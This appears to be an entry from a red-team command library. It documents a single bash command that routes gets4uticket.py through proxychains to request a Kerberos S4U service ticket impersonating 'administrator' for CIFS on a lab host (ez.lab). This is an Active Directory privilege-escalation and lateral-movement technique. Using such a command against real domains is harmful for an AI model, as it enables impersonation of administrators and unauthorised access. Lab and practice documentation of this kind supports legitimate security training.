---
id: 2826d775-20a7-4665-9cea-f924e3b048b8
name: Get a ST (service ticket) for the target account
type: command
executor: bash
data: proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab
  cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
output: null
created_at: '2023-04-06T03:56:06.311066+00:00'
updated_at: '2023-04-10T20:26:05.079234+00:00'
---

# Get a ST (service ticket) for the target account

```bash
proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v
```


